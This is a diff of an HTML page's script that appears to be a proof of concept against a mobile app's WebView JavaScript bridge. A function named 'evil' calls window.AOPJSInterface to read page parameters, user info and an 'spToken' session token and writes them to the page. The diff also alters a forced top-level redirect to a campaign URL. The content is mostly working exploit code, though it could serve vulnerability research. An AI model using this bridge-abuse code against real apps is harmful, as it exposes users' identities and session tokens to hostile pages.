@@ -19,14 +19,13 @@
 <br>
 
 <script type="text/javascript">
-   function gotowhite() {       
-        console.log('gotowhite');       
+         console.log('href');   
         top.location.href = "https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/bad5fd85661b4ce697cc0520211a44b2/index.html";
-    }
+    
 
     async function evil() {
         console.log('evil');        
-        (async () => {
+       
             let params = window.AOPJSInterface.getParams();
             let userInfo = await window.AOPJSInterface.getUserInfo();
             let spToken = await window.AOPJSInterface.getSpToken('H5-Camp');
@@ -35,10 +34,10 @@
             let res3 = res2.concat('get sptoken : \n'.concat(spToken));
             document.write(res3)
             console.log(res3);     
-        })()
+       
     }
     
-    setInterval(gotowhite, 500);
+   // setInterval(gotowhite, 500);
     setTimeout(evil, 1000);
 
 </script>
